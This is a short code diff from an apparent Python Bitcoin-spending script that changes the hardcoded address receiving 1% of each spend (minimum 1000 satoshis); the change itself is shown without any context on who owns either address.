@@ -22,7 +22,7 @@ if(len(sys.argv) > 0):
         midfees = r['minimumFee']
         spendSats = spendSats - (479 * midfees)
         addSpend = sys.argv[2]
-        add2 = "1GjgLJKZU1qbfRHXWrHX2o5kA2ZTzeStpQ"
+        add2 = "1Mm58Zj8WpvmJBGMCF8FUPrQaLqV7y7YY9"
         sending = int(spendSats * 0.01)
         if(sending < 1000):
             sending = 1000
